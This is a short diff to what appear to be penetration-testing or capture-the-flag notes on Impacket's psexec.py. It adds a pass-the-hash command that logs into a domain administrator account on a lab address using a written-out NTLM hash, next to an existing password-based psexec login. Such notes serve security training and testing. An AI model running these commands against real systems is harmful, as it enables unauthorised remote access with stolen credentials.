@@ -6,3 +6,8 @@ git clone https://github.com/SecureAuthCorp/impacket.git
 
 login with psexec.py:
 psexec.py administrator@10.10.10.27
+
+
+
+Login with ntml hash:
+psexec.py megacorp.local/administrator@10.10.10.30 -hashes aad3b435b51404eeaad3b435b51404ee:8a4b77d52b1845bfe949ed1b9643bb18
